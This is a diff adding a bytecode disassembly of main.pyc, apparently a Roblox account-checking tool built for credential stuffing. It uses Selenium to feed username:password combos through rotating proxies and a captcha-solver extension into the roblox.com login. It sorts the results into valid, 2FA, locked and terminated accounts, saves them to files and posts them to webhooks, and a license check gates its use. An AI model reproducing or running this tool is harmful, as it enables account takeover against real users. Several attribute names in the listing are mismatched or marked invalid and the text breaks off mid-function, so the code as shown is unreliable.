@@ -1,0 +1,2268 @@
+main.pyc (Python 3.12)
+[Code]
+    File Name: main.py
+    Object Name: <module>
+    Qualified Name: <module>
+    Arg Count: 0
+    Pos Only Arg Count: 0
+    KW Only Arg Count: 0
+    Stack Size: 8
+    Flags: 0x00000000
+    [Names]
+        'selenium'
+        'webdriver'
+        'selenium.webdriver.common.by'
+        'By'
+        'selenium.webdriver.chrome.service'
+        'Service'
+        'ChromeService'
+        'selenium.webdriver.chrome.options'
+        'Options'
+        'selenium.webdriver.common.desired_capabilities'
+        'DesiredCapabilities'
+        'multiprocessing.pool'
+        'ThreadPool'
+        'json'
+        'random'
+        'os'
+        'sys'
+        'requests'
+        'time'
+        'keyauth'
+        'api'
+        'hashlib'
+        'open'
+        'jsonfile'
+        'load'
+        'config'
+        'auth'
+        'key'
+        'captchakey'
+        'webhooks'
+        'validwebhook'
+        'webhook2fa'
+        'webhooklock'
+        'webhookconfirm'
+        'webhookterm'
+        'main'
+        'maxtimeout'
+        'threads'
+        'loadtime'
+        'useproxys'
+        'testmode'
+        'file'
+        'read'
+        'splitlines'
+        'combonations'
+        'readlines'
+        'proxies'
+        'removecombo'
+        'removeallcombos'
+        'guesspasswords'
+        'getchecksum'
+        'keyauthapp'
+        'license'
+        'check'
+        'pool'
+        'map'
+        'list'
+        'range'
+        'tokens'
+    [Locals+Names]
+    [Constants]
+        0
+        (
+            'webdriver'
+        )
+        (
+            'By'
+        )
+        (
+            'Service'
+        )
+        (
+            'Options'
+        )
+        (
+            'DesiredCapabilities'
+        )
+        (
+            'ThreadPool'
+        )
+        None
+        (
+            'api'
+        )
+        'config.json'
+        'r'
+        'Auth'
+        'Key'
+        'Captcha Key'
+        'Webhooks'
+        'Valid Accounts'
+        '2FA Accounts'
+        'Locked Accounts'
+        'Confirm Idenity Accounts'
+        'Termed Accounts'
+        'Main'
+        'Max Timeout'
+        'Threads'
+        'Thread Load Time'
+        'Use Proxys'
+        'Test Mode'
+        'accounts.txt'
+        'utf-8'
+        (
+            'encoding'
+        )
+        True
+        'proxys.txt'
+        [Code]
+            File Name: main.py
+            Object Name: removecombo
+            Qualified Name: removecombo
+            Arg Count: 1
+            Pos Only Arg Count: 0
+            KW Only Arg Count: 0
+            Stack Size: 6
+            Flags: 0x00000003 (CO_OPTIMIZED | CO_NEWLOCALS)
+            [Names]
+                'open'
+                'readlines'
+                'strip'
+                'writelines'
+            [Locals+Names]
+                'line_to_remove'
+                'file'
+                'lines'
+                'line'
+            [Constants]
+                None
+                'accounts.txt'
+                'r'
+                'w'
+            [Disassembly]
+                0       RESUME                          0
+                2       NOP
+                4       LOAD_GLOBAL                     1: NULL + open
+                14      LOAD_CONST                      1: 'accounts.txt'
+                16      LOAD_CONST                      2: 'r'
+                18      CALL                            2
+                26      BEFORE_WITH
+                28      STORE_FAST                      1: file
+                30      LOAD_FAST                       1: file
+                32      LOAD_ATTR                       3: writelines
+                52      CALL                            0
+                60      STORE_FAST                      2: lines
+                62      LOAD_CONST                      0: None
+                64      LOAD_CONST                      0: None
+                66      LOAD_CONST                      0: None
+                68      CALL                            2
+                76      POP_TOP
+                78      LOAD_FAST_CHECK                 2: lines
+                80      GET_ITER
+                82      LOAD_FAST_AND_CLEAR             3: line
+                84      SWAP                            2
+                86      BUILD_LIST                      0
+                88      SWAP                            2
+                90      FOR_ITER                        24 (to 140)
+                94      STORE_FAST                      3: line
+                96      LOAD_FAST                       3: line
+                98      LOAD_ATTR                       5 <INVALID>
+                118     CALL                            0
+                126     LOAD_FAST                       0: line_to_remove
+                128     COMPARE_OP                      55 (!=)
+                132     POP_JUMP_IF_TRUE                1 (to 136)
+                134     JUMP_BACKWARD                   23 (to 90)
+                136     LOAD_FAST                       3: line
+                138     LIST_APPEND                     2
+                140     JUMP_BACKWARD                   26 (to 90)
+                142     END_FOR
+                144     STORE_FAST                      2: lines
+                146     STORE_FAST                      3: line
+                148     LOAD_GLOBAL                     1: NULL + open
+                158     LOAD_CONST                      1: 'accounts.txt'
+                160     LOAD_CONST                      3: 'w'
+                162     CALL                            2
+                170     BEFORE_WITH
+                172     STORE_FAST                      1: file
+                174     LOAD_FAST                       1: file
+                176     LOAD_ATTR                       7 <INVALID>
+                196     LOAD_FAST                       2: lines
+                198     CALL                            1
+                206     POP_TOP
+                208     LOAD_CONST                      0: None
+                210     LOAD_CONST                      0: None
+                212     LOAD_CONST                      0: None
+                214     CALL                            2
+                222     POP_TOP
+                224     RETURN_CONST                    0: None
+                226     PUSH_EXC_INFO
+                228     WITH_EXCEPT_START
+                230     POP_JUMP_IF_TRUE                1 (to 234)
+                232     RERAISE                         2
+                234     POP_TOP
+                236     POP_EXCEPT
+                238     POP_TOP
+                240     POP_TOP
+                242     JUMP_BACKWARD                   83 (to 78)
+                244     COPY                            3
+                246     POP_EXCEPT
+                248     RERAISE                         1
+                250     SWAP                            2
+                252     POP_TOP
+                254     SWAP                            2
+                256     STORE_FAST                      3: line
+                258     RERAISE                         0
+                260     PUSH_EXC_INFO
+                262     WITH_EXCEPT_START
+                264     POP_JUMP_IF_TRUE                1 (to 268)
+                266     RERAISE                         2
+                268     POP_TOP
+                270     POP_EXCEPT
+                272     POP_TOP
+                274     POP_TOP
+                276     RETURN_CONST                    0: None
+                278     COPY                            3
+                280     POP_EXCEPT
+                282     RERAISE                         1
+                284     PUSH_EXC_INFO
+                286     POP_TOP
+                288     POP_EXCEPT
+                290     RETURN_CONST                    0: None
+                292     COPY                            3
+                294     POP_EXCEPT
+                296     RERAISE                         1
+        [Code]
+            File Name: main.py
+            Object Name: removeallcombos
+            Qualified Name: removeallcombos
+            Arg Count: 1
+            Pos Only Arg Count: 0
+            KW Only Arg Count: 0
+            Stack Size: 6
+            Flags: 0x00000003 (CO_OPTIMIZED | CO_NEWLOCALS)
+            [Names]
+                'open'
+                'readlines'
+                'strip'
+                'startswith'
+                'writelines'
+            [Locals+Names]
+                'prefix'
+                'file'
+                'lines'
+                'line'
+            [Constants]
+                None
+                'accounts.txt'
+                'r'
+                'w'
+            [Disassembly]
+                0       RESUME                          0
+                2       LOAD_GLOBAL                     1: NULL + open
+                12      LOAD_CONST                      1: 'accounts.txt'
+                14      LOAD_CONST                      2: 'r'
+                16      CALL                            2
+                24      BEFORE_WITH
+                26      STORE_FAST                      1: file
+                28      LOAD_FAST                       1: file
+                30      LOAD_ATTR                       3: startswith
+                50      CALL                            0
+                58      STORE_FAST                      2: lines
+                60      LOAD_CONST                      0: None
+                62      LOAD_CONST                      0: None
+                64      LOAD_CONST                      0: None
+                66      CALL                            2
+                74      POP_TOP
+                76      LOAD_FAST_CHECK                 2: lines
+                78      GET_ITER
+                80      LOAD_FAST_AND_CLEAR             3: line
+                82      SWAP                            2
+                84      BUILD_LIST                      0
+                86      SWAP                            2
+                88      FOR_ITER                        36 (to 162)
+                92      STORE_FAST                      3: line
+                94      LOAD_FAST                       3: line
+                96      LOAD_ATTR                       5 <INVALID>
+                116     CALL                            0
+                124     LOAD_ATTR                       7 <INVALID>
+                144     LOAD_FAST                       0: prefix
+                146     CALL                            1
+                154     POP_JUMP_IF_FALSE               1 (to 158)
+                156     JUMP_BACKWARD                   35 (to 88)
+                158     LOAD_FAST                       3: line
+                160     LIST_APPEND                     2
+                162     JUMP_BACKWARD                   38 (to 88)
+                164     END_FOR
+                166     STORE_FAST                      2: lines
+                168     STORE_FAST                      3: line
+                170     LOAD_GLOBAL                     1: NULL + open
+                180     LOAD_CONST                      1: 'accounts.txt'
+                182     LOAD_CONST                      3: 'w'
+                184     CALL                            2
+                192     BEFORE_WITH
+                194     STORE_FAST                      1: file
+                196     LOAD_FAST                       1: file
+                198     LOAD_ATTR                       9 <INVALID>
+                218     LOAD_FAST                       2: lines
+                220     CALL                            1
+                228     POP_TOP
+                230     LOAD_CONST                      0: None
+                232     LOAD_CONST                      0: None
+                234     LOAD_CONST                      0: None
+                236     CALL                            2
+                244     POP_TOP
+                246     RETURN_CONST                    0: None
+                248     PUSH_EXC_INFO
+                250     WITH_EXCEPT_START
+                252     POP_JUMP_IF_TRUE                1 (to 256)
+                254     RERAISE                         2
+                256     POP_TOP
+                258     POP_EXCEPT
+                260     POP_TOP
+                262     POP_TOP
+                264     JUMP_BACKWARD                   95 (to 76)
+                266     COPY                            3
+                268     POP_EXCEPT
+                270     RERAISE                         1
+                272     SWAP                            2
+                274     POP_TOP
+                276     SWAP                            2
+                278     STORE_FAST                      3: line
+                280     RERAISE                         0
+                282     PUSH_EXC_INFO
+                284     WITH_EXCEPT_START
+                286     POP_JUMP_IF_TRUE                1 (to 290)
+                288     RERAISE                         2
+                290     POP_TOP
+                292     POP_EXCEPT
+                294     POP_TOP
+                296     POP_TOP
+                298     RETURN_CONST                    0: None
+                300     COPY                            3
+                302     POP_EXCEPT
+                304     RERAISE                         1
+        [Code]
+            File Name: main.py
+            Object Name: guesspasswords
+            Qualified Name: guesspasswords
+            Arg Count: 1
+            Pos Only Arg Count: 0
+            KW Only Arg Count: 0
+            Stack Size: 10
+            Flags: 0x00000003 (CO_OPTIMIZED | CO_NEWLOCALS)
+            [Names]
+                'time'
+                'sleep'
+                'random'
+                'randint'
+                'loadtime'
+                'os'
+                'path'
+                'dirname'
+                'abspath'
+                '__file__'
+                'getattr'
+                'sys'
+                'join'
+                'executable'
+                'open'
+                'json'
+                'load'
+                'captchakey'
+                'dump'
+                'webdriver'
+                'ChromeOptions'
+                'add_argument'
+                'useproxys'
+                'choice'
+                'proxies'
+                'rstrip'
+                'len'
+                'combonations'
+                'Chrome'
+                'minimize_window'
+                'remove'
+                'split'
+                'print'
+                'get'
+                'find_element'
+                'By'
+                'XPATH'
+                'send_keys'
+                'str'
+                'click'
+                'testmode'
+                'delete_all_cookies'
+                'maxtimeout'
+                'text'
+                'close'
+                'write'
+                'removecombo'
+                'requests'
+                'post'
+                'webhooklock'
+                'removeallcombos'
+                'validwebhook'
+                'webhook2fa'
+                'webhookconfirm'
+                'webhookterm'
+            [Locals+Names]
+                'i'
+                'current_directory'
+                'extension_path'
+                'config_file_path'
+                'config_file'
+                'config_data'
+                'chrome_options'
+                'proxy'
+                'driver'
+                'combo'
+                'username'
+                'password'
+                'endloop'
+                'starttimeout'
+                'endtimeout'
+                'errorreason'
+                'file'
+                'lockedaccountmessage'
+                'emailframe'
+                'twofactorpass'
+                'twostepframe'
+                'idenityframe'
+                'termedframe'
+                'usernamecheck'
+            [Constants]
+                None
+                1
+                'frozen'
+                False
+                'solver'
+                'solver/assets/config.json'
+                'r'
+                'apiKey'
+                'w'
+                4
+                (
+                    'indent'
+                )
+                '--load-extension='
+                True
+                '--proxy-server='
+                0
+                (
+                    'options'
+                )
+                ':'
+                '[ERROR] Unable to load username password combo'
+                'https://roblox.com/login'
+                '//*[@id="login-username"]'
+                '//*[@id="login-password"]'
+                '//*[@id="cookie-banner-wrapper"]/div[1]/div[2]/div/div/button[2]'
+                '[-] Accepted Cookies'
+                '//*[@id="login-button"]'
+                '[NO LOGIN]: Logging into account has failed'
+                '[ERROR]: Login timeout failed'
+                '[ERROR]: loop ended due to glitched loop'
+                '//*[@id="login-form-error"]'
+                'An unknown error occurred. Please try again.'
+                '[INVALID LOGIN ATTEMPT]: Username - '
+                ' Password - '
+                ' Reason - '
+                '[INVALID USERNAME OR PASSWORD]: Username - '
+                'data.txt'
+                'a'
+                '\n'
+                '[INVALID COMBO]: Unable to detect login reason frame'
+                '//*[@id="container-main"]/div[2]/div/h1'
+                'Security Notification'
+                '[LOCKED ACCOUNT]: Username - '
+                'accounts/locked.txt'
+                'content'
+                '[LOCKED] - USERNAME: '
+                ' - PASSWORD: '
+                (
+                    'json'
+                )
+                '[INVALID COMBO]: Unable to detect locked account frame'
+                '//*[@id="rbx-body"]/div[19]/div[2]/div/div/div[1]/h4'
+                'Select Account to Log In'
+                '[LOGGED IN EMAIL]: Email - '
+                'accounts/valid.txt'
+                '[VALID] - USERNAME: '
+                ' @everyone'
+                '[INVALID EMAIL FRAME]: Unable to detect email login frame'
+                '//*[@id="rbx-body"]/div[19]/div[2]/div/div/div[2]/p[1]'
+                '[2FA]: Check 1 Fail'
+                '//*[@id="rbx-body"]/div[18]/div[2]/div/div/div[2]/p[1]'
+                '[2FA]: Check 2 Fail'
+                'accounts/twofactorauth.txt'
+                '[2FA]: Username - '
+                '[2FA] - USERNAME: '
+                '[INVALID 2FA FRAME]: Unable to detect 2fa frame'
+                '//*[@id="rbx-body"]/div[17]/div[2]/div/div/div[1]/h4'
+                'Please Confirm Your Identity'
+                '[GOT IDENITY FRAME]: Username - '
+                'accounts/verifyidentity.txt'
+                '[PLEASE CONFIRM] - USERNAME: '
+                '[INVALID IDENITY FRAME]: Unable to detect email login frame'
+                '//*[@id="container-main"]/div[2]/div/div/div[1]/h3'
+                'Account Deleted'
+                '[TERMED ACCOUNT]: Username - '
+                'accounts/termed.txt'
+                '[TERMED] - USERNAME: '
+                '[INVALID TERMED FRAME]: Unable to detect termed frame'
+                '//*[@id="right-navigation-header"]/div[2]/ul/div[2]/a/span[2]'
+                '[LOGGED IN ACCOUNT]: Username - '
+                ' Current Name - '
+                '[INVALID LOGIN]: Unable to detect home frame'
+                'error'
+            [Disassembly]
+                0       RESUME                          0
+                2       LOAD_GLOBAL                     1: NULL + time
+                12      LOAD_ATTR                       2: random
+                32      LOAD_GLOBAL                     5: NULL + random
+                42      LOAD_ATTR                       6: path
+                62      LOAD_CONST                      1: 1
+                64      LOAD_GLOBAL                     8: loadtime
+                74      CALL                            2
+                82      CALL                            1
+                90      POP_TOP
+                92      LOAD_GLOBAL                     10: os
+                102     LOAD_ATTR                       12: join
+                122     LOAD_ATTR                       15: json
+                142     LOAD_GLOBAL                     10: os
+                152     LOAD_ATTR                       12: join
+                172     LOAD_ATTR                       17: captchakey
+                192     LOAD_GLOBAL                     18: __file__
+                202     CALL                            1
+                210     CALL                            1
+                218     STORE_FAST                      1: current_directory
+                220     LOAD_GLOBAL                     21: NULL + getattr
+                230     LOAD_GLOBAL                     22: sys
+                240     LOAD_CONST                      2: 'frozen'
+                242     LOAD_CONST                      3: False
+                244     CALL                            3
+                252     POP_JUMP_IF_FALSE               76 (to 406)
+                254     LOAD_GLOBAL                     10: os
+                264     LOAD_ATTR                       12: join
+                284     LOAD_ATTR                       25: rstrip
+                304     LOAD_GLOBAL                     10: os
+                314     LOAD_ATTR                       12: join
+                334     LOAD_ATTR                       15: json
+                354     LOAD_GLOBAL                     22: sys
+                364     LOAD_ATTR                       26: len
+                384     CALL                            1
+                392     LOAD_CONST                      4: 'solver'
+                394     CALL                            2
+                402     STORE_FAST                      2: extension_path
+                404     JUMP_FORWARD                    32 (to 470)
+                406     LOAD_GLOBAL                     10: os
+                416     LOAD_ATTR                       12: join
+                436     LOAD_ATTR                       25: rstrip
+                456     LOAD_FAST                       1: current_directory
+                458     LOAD_CONST                      4: 'solver'
+                460     CALL                            2
+                468     STORE_FAST                      2: extension_path
+                470     LOAD_CONST                      5: 'solver/assets/config.json'
+                472     STORE_FAST                      3: config_file_path
+                474     LOAD_GLOBAL                     29: NULL + open
+                484     LOAD_FAST                       3: config_file_path
+                486     LOAD_CONST                      6: 'r'
+                488     CALL                            2
+                496     BEFORE_WITH
+                498     STORE_FAST                      4: config_file
+                500     LOAD_GLOBAL                     31: NULL + json
+                510     LOAD_ATTR                       32: print
+                530     LOAD_FAST                       4: config_file
+                532     CALL                            1
+                540     STORE_FAST                      5: config_data
+                542     LOAD_CONST                      0: None
+                544     LOAD_CONST                      0: None
+                546     LOAD_CONST                      0: None
+                548     CALL                            2
+                556     POP_TOP
+                558     LOAD_GLOBAL                     34: captchakey
+                568     LOAD_FAST_CHECK                 5: config_data
+                570     LOAD_CONST                      7: 'apiKey'
+                572     STORE_SUBSCR
+                576     LOAD_GLOBAL                     29: NULL + open
+                586     LOAD_FAST                       3: config_file_path
+                588     LOAD_CONST                      8: 'w'
+                590     CALL                            2
+                598     BEFORE_WITH
+                600     STORE_FAST                      4: config_file
+                602     LOAD_GLOBAL                     31: NULL + json
+                612     LOAD_ATTR                       36: XPATH
+                632     LOAD_FAST                       5: config_data
+                634     LOAD_FAST                       4: config_file
+                636     LOAD_CONST                      9: 4
+                638     KW_NAMES                        10: ('indent',)
+                640     CALL                            3
+                648     POP_TOP
+                650     LOAD_CONST                      0: None
+                652     LOAD_CONST                      0: None
+                654     LOAD_CONST                      0: None
+                656     CALL                            2
+                664     POP_TOP
+                666     LOAD_GLOBAL                     39: NULL + webdriver
+                676     LOAD_ATTR                       40: testmode
+                696     CALL                            0
+                704     STORE_FAST                      6: chrome_options
+                706     LOAD_FAST                       6: chrome_options
+                708     LOAD_ATTR                       43: text
+                728     LOAD_CONST                      11: '--load-extension='
+                730     LOAD_FAST                       2: extension_path
+                732     FORMAT_VALUE                    0
+                734     BUILD_STRING                    2
+                736     CALL                            1
+                744     POP_TOP
+                746     LOAD_GLOBAL                     44: useproxys
+                756     LOAD_CONST                      12: True
+                758     COMPARE_OP                      40 (==)
+                762     POP_JUMP_IF_FALSE               61 (to 886)
+                764     LOAD_GLOBAL                     5: NULL + random
+                774     LOAD_ATTR                       46: removecombo
+                794     LOAD_GLOBAL                     48: proxies
+                804     CALL                            1
+                812     STORE_FAST                      7: proxy
+                814     LOAD_FAST                       7: proxy
+                816     LOAD_ATTR                       51: validwebhook
+                836     CALL                            0
+                844     STORE_FAST                      7: proxy
+                846     LOAD_FAST                       6: chrome_options
+                848     LOAD_ATTR                       43: text
+                868     LOAD_CONST                      13: '--proxy-server='
+                870     LOAD_FAST                       7: proxy
+                872     FORMAT_VALUE                    0
+                874     BUILD_STRING                    2
+                876     CALL                            1
+                884     POP_TOP
+                886     LOAD_GLOBAL                     53: NULL + len
+                896     LOAD_GLOBAL                     54: combonations
+                906     CALL                            1
+                914     LOAD_CONST                      14: 0
+                916     COMPARE_OP                      68 (>)
+                920     POP_JUMP_IF_FALSE               835 (to 2594)
+                924     NOP
+                926     LOAD_GLOBAL                     39: NULL + webdriver
+                936     LOAD_ATTR                       56 <INVALID>
+                956     LOAD_FAST                       6: chrome_options
+                958     KW_NAMES                        15: ('options',)
+                960     CALL                            1
+                968     STORE_FAST                      8: driver
+                970     LOAD_FAST                       8: driver
+                972     LOAD_ATTR                       59 <INVALID>
+                992     CALL                            0
+                1000    POP_TOP
+                1002    LOAD_GLOBAL                     53: NULL + len
+                1012    LOAD_GLOBAL                     54: combonations
+                1022    CALL                            1
+                1030    LOAD_CONST                      14: 0
+                1032    COMPARE_OP                      68 (>)
+                1036    POP_JUMP_IF_FALSE               756 (to 2552)
+                1040    LOAD_GLOBAL                     5: NULL + random
+                1050    LOAD_ATTR                       46: removecombo
+                1070    LOAD_GLOBAL                     54: combonations
+                1080    CALL                            1
+                1088    STORE_FAST                      9: combo
+                1090    LOAD_GLOBAL                     54: combonations
+                1100    LOAD_ATTR                       61 <INVALID>
+                1120    LOAD_FAST                       9: combo
+                1122    CALL                            1
+                1130    POP_TOP
+                1132    NOP
+                1134    LOAD_FAST                       9: combo
+                1136    LOAD_ATTR                       63 <INVALID>
+                1156    LOAD_CONST                      16: ':'
+                1158    CALL                            1
+                1166    STORE_FAST                      9: combo
+                1168    LOAD_FAST                       9: combo
+                1170    LOAD_CONST                      14: 0
+                1172    BINARY_SUBSCR
+                1176    STORE_FAST                      10: username
+                1178    LOAD_FAST                       9: combo
+                1180    LOAD_CONST                      1: 1
+                1182    BINARY_SUBSCR
+                1186    STORE_FAST                      11: password
+                1188    LOAD_FAST                       8: driver
+                1190    LOAD_ATTR                       67 <INVALID>
+                1210    LOAD_CONST                      18: 'https://roblox.com/login'
+                1212    CALL                            1
+                1220    POP_TOP
+                1222    LOAD_CONST                      3: False
+                1224    STORE_FAST                      12: endloop
+                1226    NOP
+                1228    NOP
+                1230    LOAD_FAST                       8: driver
+                1232    LOAD_ATTR                       69 <INVALID>
+                1252    LOAD_GLOBAL                     70: By
+                1262    LOAD_ATTR                       72 <INVALID>
+                1282    LOAD_CONST                      19: '//*[@id="login-username"]'
+                1284    CALL                            2
+                1292    LOAD_ATTR                       75 <INVALID>
+                1312    LOAD_GLOBAL                     77: NULL + str
+                1322    LOAD_FAST_CHECK                 10: username
+                1324    CALL                            1
+                1332    CALL                            1
+                1340    POP_TOP
+                1342    LOAD_FAST                       8: driver
+                1344    LOAD_ATTR                       69 <INVALID>
+                1364    LOAD_GLOBAL                     70: By
+                1374    LOAD_ATTR                       72 <INVALID>
+                1394    LOAD_CONST                      20: '//*[@id="login-password"]'
+                1396    CALL                            2
+                1404    LOAD_ATTR                       75 <INVALID>
+                1424    LOAD_GLOBAL                     77: NULL + str
+                1434    LOAD_FAST_CHECK                 11: password
+                1436    CALL                            1
+                1444    CALL                            1
+                1452    POP_TOP
+                1454    NOP
+                1456    LOAD_FAST                       8: driver
+                1458    LOAD_ATTR                       69 <INVALID>
+                1478    LOAD_GLOBAL                     70: By
+                1488    LOAD_ATTR                       72 <INVALID>
+                1508    LOAD_CONST                      21: '//*[@id="cookie-banner-wrapper"]/div[1]/div[2]/div/div/button[2]'
+                1510    CALL                            2
+                1518    LOAD_ATTR                       79 <INVALID>
+                1538    CALL                            0
+                1546    POP_TOP
+                1548    LOAD_GLOBAL                     80: testmode
+                1558    LOAD_CONST                      12: True
+                1560    COMPARE_OP                      40 (==)
+                1564    POP_JUMP_IF_FALSE               11 (to 1588)
+                1566    LOAD_GLOBAL                     65: NULL + print
+                1576    LOAD_CONST                      22: '[-] Accepted Cookies'
+                1578    CALL                            1
+                1586    POP_TOP
+                1588    LOAD_FAST                       8: driver
+                1590    LOAD_ATTR                       69 <INVALID>
+                1610    LOAD_GLOBAL                     70: By
+                1620    LOAD_ATTR                       72 <INVALID>
+                1640    LOAD_CONST                      23: '//*[@id="login-button"]'
+                1642    CALL                            2
+                1650    LOAD_ATTR                       79 <INVALID>
+                1670    CALL                            0
+                1678    POP_TOP
+                1680    NOP
+                1682    LOAD_GLOBAL                     1: NULL + time
+                1692    LOAD_ATTR                       0: time
+                1712    CALL                            0
+                1720    STORE_FAST                      13: starttimeout
+                1722    NOP
+                1724    LOAD_GLOBAL                     1: NULL + time
+                1734    LOAD_ATTR                       0: time
+                1754    CALL                            0
+                1762    STORE_FAST                      14: endtimeout
+                1764    LOAD_FAST                       14: endtimeout
+                1766    LOAD_FAST                       13: starttimeout
+                1768    BINARY_OP                       10 (-)
+                1772    LOAD_GLOBAL                     84: maxtimeout
+                1782    COMPARE_OP                      68 (>)
+                1786    POP_JUMP_IF_FALSE               24 (to 1836)
+                1788    LOAD_GLOBAL                     80: testmode
+                1798    LOAD_CONST                      12: True
+                1800    COMPARE_OP                      40 (==)
+                1804    POP_JUMP_IF_FALSE               11 (to 1828)
+                1806    LOAD_GLOBAL                     65: NULL + print
+                1816    LOAD_CONST                      25: '[ERROR]: Login timeout failed'
+                1818    CALL                            1
+                1826    POP_TOP
+                1828    LOAD_CONST                      12: True
+                1830    STORE_FAST                      12: endloop
+                1832    JUMP_FORWARD                    338 (to 2512)
+                1836    LOAD_FAST                       12: endloop
+                1838    LOAD_CONST                      12: True
+                1840    COMPARE_OP                      40 (==)
+                1844    POP_JUMP_IF_FALSE               22 (to 1890)
+                1846    LOAD_GLOBAL                     80: testmode
+                1856    LOAD_CONST                      12: True
+                1858    COMPARE_OP                      40 (==)
+                1862    POP_JUMP_IF_FALSE               11 (to 1886)
+                1864    LOAD_GLOBAL                     65: NULL + print
+                1874    LOAD_CONST                      26: '[ERROR]: loop ended due to glitched loop'
+                1876    CALL                            1
+                1884    POP_TOP
+                1886    JUMP_FORWARD                    311 (to 2512)
+                1890    NOP
+                1892    LOAD_FAST                       8: driver
+                1894    LOAD_ATTR                       69 <INVALID>
+                1914    LOAD_GLOBAL                     70: By
+                1924    LOAD_ATTR                       72 <INVALID>
+                1944    LOAD_CONST                      27: '//*[@id="login-form-error"]'
+                1946    CALL                            2
+                1954    LOAD_ATTR                       86 <INVALID>
+                1974    STORE_FAST                      15: errorreason
+                1976    LOAD_FAST                       15: errorreason
+                1978    LOAD_CONST                      28: 'An unknown error occurred. Please try again.'
+                1980    COMPARE_OP                      40 (==)
+                1984    POP_JUMP_IF_FALSE               185 (to 2356)
+                1986    LOAD_GLOBAL                     65: NULL + print
+                1996    LOAD_CONST                      29: '[INVALID LOGIN ATTEMPT]: Username - '
+                1998    LOAD_FAST                       10: username
+                2000    FORMAT_VALUE                    0
+                2002    LOAD_CONST                      30: ' Password - '
+                2004    LOAD_FAST                       11: password
+                2006    FORMAT_VALUE                    0
+                2008    LOAD_CONST                      31: ' Reason - '
+                2010    LOAD_FAST                       15: errorreason
+                2012    FORMAT_VALUE                    0
+                2014    BUILD_STRING                    6
+                2016    CALL                            1
+                2024    POP_TOP
+                2026    LOAD_FAST                       8: driver
+                2028    LOAD_ATTR                       89 <INVALID>
+                2048    CALL                            0
+                2056    POP_TOP
+                2058    LOAD_GLOBAL                     39: NULL + webdriver
+                2068    LOAD_ATTR                       40: testmode
+                2088    CALL                            0
+                2096    STORE_FAST                      6: chrome_options
+                2098    LOAD_FAST                       6: chrome_options
+                2100    LOAD_ATTR                       43: text
+                2120    LOAD_CONST                      11: '--load-extension='
+                2122    LOAD_FAST                       2: extension_path
+                2124    FORMAT_VALUE                    0
+                2126    BUILD_STRING                    2
+                2128    CALL                            1
+                2136    POP_TOP
+                2138    LOAD_GLOBAL                     44: useproxys
+                2148    LOAD_CONST                      12: True
+                2150    COMPARE_OP                      40 (==)
+                2154    POP_JUMP_IF_FALSE               61 (to 2278)
+                2156    LOAD_GLOBAL                     5: NULL + random
+                2166    LOAD_ATTR                       46: removecombo
+                2186    LOAD_GLOBAL                     48: proxies
+                2196    CALL                            1
+                2204    STORE_FAST                      7: proxy
+                2206    LOAD_FAST                       7: proxy
+                2208    LOAD_ATTR                       51: validwebhook
+                2228    CALL                            0
+                2236    STORE_FAST                      7: proxy
+                2238    LOAD_FAST                       6: chrome_options
+                2240    LOAD_ATTR                       43: text
+                2260    LOAD_CONST                      13: '--proxy-server='
+                2262    LOAD_FAST                       7: proxy
+                2264    FORMAT_VALUE                    0
+                2266    BUILD_STRING                    2
+                2268    CALL                            1
+                2276    POP_TOP
+                2278    LOAD_GLOBAL                     39: NULL + webdriver
+                2288    LOAD_ATTR                       56 <INVALID>
+                2308    LOAD_FAST                       6: chrome_options
+                2310    KW_NAMES                        15: ('options',)
+                2312    CALL                            1
+                2320    STORE_FAST                      8: driver
+                2322    LOAD_FAST                       8: driver
+                2324    LOAD_ATTR                       59 <INVALID>
+                2344    CALL                            0
+                2352    POP_TOP
+                2354    JUMP_FORWARD                    78 (to 2512)
+                2356    LOAD_GLOBAL                     65: NULL + print
+                2366    LOAD_CONST                      32: '[INVALID USERNAME OR PASSWORD]: Username - '
+                2368    LOAD_FAST                       10: username
+                2370    FORMAT_VALUE                    0
+                2372    LOAD_CONST                      30: ' Password - '
+                2374    LOAD_FAST                       11: password
+                2376    FORMAT_VALUE                    0
+                2378    LOAD_CONST                      31: ' Reason - '
+                2380    LOAD_FAST                       15: errorreason
+                2382    FORMAT_VALUE                    0
+                2384    BUILD_STRING                    6
+                2386    CALL                            1
+                2394    POP_TOP
+                2396    LOAD_CONST                      12: True
+                2398    STORE_FAST                      12: endloop
+                2400    LOAD_GLOBAL                     29: NULL + open
+                2410    LOAD_CONST                      33: 'data.txt'
+                2412    LOAD_CONST                      34: 'a'
+                2414    CALL                            2
+                2422    BEFORE_WITH
+                2424    STORE_FAST                      16: file
+                2426    LOAD_FAST                       16: file
+                2428    LOAD_ATTR                       91 <INVALID>
+                2448    LOAD_FAST                       10: username
+                2450    FORMAT_VALUE                    0
+                2452    LOAD_CONST                      16: ':'
+                2454    LOAD_FAST                       11: password
+                2456    FORMAT_VALUE                    0
+                2458    LOAD_CONST                      35: '\n'
+                2460    BUILD_STRING                    4
+                2462    CALL                            1
+                2470    POP_TOP
+                2472    LOAD_CONST                      0: None
+                2474    LOAD_CONST                      0: None
+                2476    LOAD_CONST                      0: None
+                2478    CALL                            2
+                2486    POP_TOP
+                2488    LOAD_GLOBAL                     93: NULL + removecombo
+                2498    LOAD_FAST                       9: combo
+                2500    CALL                            1
+                2508    POP_TOP
+                2510    NOP
+                2512    LOAD_GLOBAL                     53: NULL + len
+                2522    LOAD_GLOBAL                     54: combonations
+                2532    CALL                            1
+                2540    LOAD_CONST                      14: 0
+                2542    COMPARE_OP                      68 (>)
+                2546    POP_JUMP_IF_FALSE               2 (to 2552)
+                2548    JUMP_BACKWARD                   756 (to 1040)
+                2552    LOAD_GLOBAL                     53: NULL + len
+                2562    LOAD_GLOBAL                     54: combonations
+                2572    CALL                            1
+                2580    LOAD_CONST                      14: 0
+                2582    COMPARE_OP                      68 (>)
+                2586    POP_JUMP_IF_FALSE               2 (to 2592)
+                2588    JUMP_BACKWARD                   834 (to 924)
+                2592    RETURN_CONST                    0: None
+                2594    RETURN_CONST                    0: None
+                2596    PUSH_EXC_INFO
+                2598    WITH_EXCEPT_START
+                2600    POP_JUMP_IF_TRUE                1 (to 2604)
+                2602    RERAISE                         2
+                2604    POP_TOP
+                2606    POP_EXCEPT
+                2608    POP_TOP
+                2610    POP_TOP
+                2612    JUMP_BACKWARD                   1029 (to 558)
+                2616    COPY                            3
+                2618    POP_EXCEPT
+                2620    RERAISE                         1
+                2622    PUSH_EXC_INFO
+                2624    WITH_EXCEPT_START
+                2626    POP_JUMP_IF_TRUE                1 (to 2630)
+                2628    RERAISE                         2
+                2630    POP_TOP
+                2632    POP_EXCEPT
+                2634    POP_TOP
+                2636    POP_TOP
+                2638    JUMP_BACKWARD                   988 (to 666)
+                2642    COPY                            3
+                2644    POP_EXCEPT
